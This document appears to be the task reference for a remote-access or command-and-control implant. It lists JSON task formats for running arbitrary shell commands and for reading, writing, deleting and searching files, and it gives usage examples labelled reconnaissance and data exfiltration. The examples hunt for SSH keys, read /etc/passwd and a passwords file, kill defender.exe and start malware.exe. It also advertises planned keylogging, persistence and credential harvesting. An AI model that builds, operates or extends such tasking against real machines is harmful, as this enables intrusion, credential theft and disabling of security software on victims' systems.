# Agent Task Reference

Quick reference for all available agent tasks.

## 📋 System Information

### `sys_info`
Collects basic system information (hostname, OS, architecture, kernel version).

```json
{
  "id": "task-001",
  "type": "sys_info",
  "params": {},
  "runOnce": true
}
```

### `priv_check`
Checks privilege level (root/admin, sudo access).

```json
{
  "id": "task-002",
  "type": "priv_check",
  "params": {},
  "runOnce": false
}
```

## 💻 Command Execution

### `cmd`
Executes arbitrary shell commands.

```json
{
  "id": "task-003",
  "type": "cmd",
  "params": {
    "command": "whoami"
  },
  "runOnce": false
}
```

## 📁 File Operations

### `file_list`
Lists files in a directory.

```json
{
  "id": "task-004",
  "type": "file_list",
  "params": {
    "path": "/tmp"
  },
  "runOnce": false
}
```

**Returns**: JSON array with file info (name, size, isDir, modTime, mode)

### `file_read`
Reads a file (base64 encoded, max 10MB).

```json
{
  "id": "task-005",
  "type": "file_read",
  "params": {
    "path": "/etc/passwd"
  },
  "runOnce": false
}
```

**Returns**: JSON with base64 encoded file data

### `file_write`
Writes data to a file (expects base64 encoded data).

```json
{
  "id": "task-006",
  "type": "file_write",
  "params": {
    "path": "/tmp/test.txt",
    "data": "SGVsbG8gV29ybGQh",
    "append": "false"
  },
  "runOnce": false
}
```

### `file_delete`
Deletes a file or directory.

```json
{
  "id": "task-007",
  "type": "file_delete",
  "params": {
    "path": "/tmp/test.txt",
    "recursive": "false"
  },
  "runOnce": false
}
```

### `file_download`
Prepares file for download (handles large files with chunking).

```json
{
  "id": "task-008",
  "type": "file_download",
  "params": {
    "path": "/var/log/syslog"
  },
  "runOnce": false
}
```

**Note**: Files > 1MB return metadata; use `file_chunk` to retrieve pieces

### `file_search`
Searches for files matching a pattern (max depth: 5).

```json
{
  "id": "task-009",
  "type": "file_search",
  "params": {
    "path": "/home",
    "pattern": "*.conf"
  },
  "runOnce": false
}
```

**Pattern examples**:
- `*.txt` - All text files
- `backup*` - Files starting with "backup"
- `id_rsa*` - SSH keys

## 🔧 Process Operations

### `proc_list`
Lists all running processes.

```json
{
  "id": "task-010",
  "type": "proc_list",
  "params": {},
  "runOnce": false
}
```

**Windows**: Returns PID, Name, Memory  
**Linux**: Returns User, PID, CPU%, Memory%, Command

### `proc_kill`
Kills a process by PID.

```json
{
  "id": "task-011",
  "type": "proc_kill",
  "params": {
    "pid": "1234"
  },
  "runOnce": false
}
```

### `proc_kill_name`
Kills all processes matching a name.

```json
{
  "id": "task-012",
  "type": "proc_kill_name",
  "params": {
    "name": "notepad.exe"
  },
  "runOnce": false
}
```

**Windows**: Use full name with extension (e.g., `chrome.exe`)  
**Linux**: Use process name without path (e.g., `apache2`)

### `proc_start`
Starts a new process.

```json
{
  "id": "task-013",
  "type": "proc_start",
  "params": {
    "command": "calc.exe",
    "background": "true"
  },
  "runOnce": false
}
```

**background**: `"true"` = detached, `"false"` = wait for completion

### `proc_info`
Gets detailed information about a specific process.

```json
{
  "id": "task-014",
  "type": "proc_info",
  "params": {
    "pid": "1234"
  },
  "runOnce": false
}
```

## 🎯 Usage Examples

### Reconnaissance
```json
[
  {"id": "recon-1", "type": "sys_info", "params": {}, "runOnce": true},
  {"id": "recon-2", "type": "priv_check", "params": {}, "runOnce": true},
  {"id": "recon-3", "type": "proc_list", "params": {}, "runOnce": true},
  {"id": "recon-4", "type": "file_search", "params": {"path": "/home", "pattern": "id_rsa*"}, "runOnce": true}
]
```

### Data Exfiltration
```json
[
  {"id": "exfil-1", "type": "file_search", "params": {"path": "C:\\Users", "pattern": "*.docx"}, "runOnce": true},
  {"id": "exfil-2", "type": "file_read", "params": {"path": "C:\\Users\\Admin\\Documents\\passwords.txt"}, "runOnce": false}
]
```

### Process Management
```json
[
  {"id": "proc-1", "type": "proc_list", "params": {}, "runOnce": false},
  {"id": "proc-2", "type": "proc_kill_name", "params": {"name": "defender.exe"}, "runOnce": false},
  {"id": "proc-3", "type": "proc_start", "params": {"command": "malware.exe", "background": "true"}, "runOnce": false}
]
```

## ⚙️ Task Parameters

### Common Fields
- **id**: Unique task identifier
- **type**: Task type (see above)
- **params**: Task-specific parameters (key-value pairs)
- **runOnce**: Execute only once (`true`) or allow repeats (`false`)

### Parameter Types
All parameters are strings, convert booleans to `"true"`/`"false"`

## 📊 Response Format

All tasks return a `TaskResult`:

```json
{
  "taskId": "task-001",
  "type": "sys_info",
  "status": "completed",
  "output": "{ ... result data ... }",
  "error": ""
}
```

**status**: `"completed"` or `"failed"`  
**output**: Task output (often JSON formatted)  
**error**: Error message if status is `"failed"`

## 🔒 Security Notes

- File operations respect OS permissions
- Process operations may require elevated privileges
- Base64 encoding handles binary files safely
- Large files use chunking to prevent memory issues
- All errors are caught and reported, agent won't crash

## 🚀 Coming Soon

- Network scanning
- Port forwarding
- Screenshot capture
- Keylogging
- Persistence installation
- Credential harvesting
